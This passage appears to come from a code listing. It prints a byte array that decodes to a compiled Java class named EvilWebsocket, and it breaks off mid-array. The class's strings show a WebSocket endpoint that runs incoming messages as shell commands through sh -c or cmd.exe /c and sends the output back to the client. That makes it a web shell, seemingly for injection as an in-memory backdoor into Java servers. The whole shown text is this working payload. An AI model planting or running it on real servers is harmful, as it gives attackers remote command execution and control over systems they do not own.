<span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">77</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">108</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">104</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">79</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">59</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">102</span>, <span class="number">105</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">102</span>, <span class="number">105</span>, <span class="number">103</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">102</span>, <span class="number">105</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">83</span>, <span class="number">105</span>, <span class="number">103</span>, <span class="number">110</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">87</span>, <span class="number">104</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">67</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">72</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">36</span>, <span class="number">87</span>, <span class="number">104</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">60</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">62</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">69</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">87</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">46</span>, <span class="number">110</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">113</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">114</span>, <span class="number">0</span>, <span class="number">115</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">116</span>, <span class="number">0</span>, <span class="number">117</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">119</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">118</span>, <span class="number">0</span>, <span class="number">119</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">45</span>, <span class="number">99</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">120</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">121</span>, <span class="number">0</span>, <span class="number">122</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">123</span>, <span class="number">0</span>, <span class="number">124</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">125</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">0</span>, <span class="number">127</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, -<span class="number">128</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">92</span>, <span class="number">65</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">127</span>, <span class="number">0</span>, -<span class="number">126</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">125</span>, <span class="number">0</span>, -<span class="number">124</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">123</span>, <span class="number">0</span>, <span class="number">117</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">7</span>, <span class="number">0</span>, -<span class="number">122</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">121</span>, <span class="number">0</span>, -<span class="number">119</span>, <span class="number">7</span>, <span class="number">0</span>, -<span class="number">117</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">116</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">115</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">12</span>, <span class="number">0</span>, -<span class="number">114</span>, <span class="number">0</span>, -<span class="number">113</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">69</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">87</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">7</span>, <span class="number">0</span>, -<span class="number">112</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">72</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">36</span>, <span class="number">87</span>, <span class="number">104</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">116</span>, <span class="number">121</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">116</span>, <span class="number">111</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">67</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">113</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">90</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">68</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">78</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">90</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">66</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">66</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">69</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">36</span>, <span class="number">66</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">59</span>, <span class="number">7</span>, <span class="number">0</span>, -<span class="number">111</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">69</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">36</span>, <span class="number">66</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">84</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">72</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">72</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">72</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, 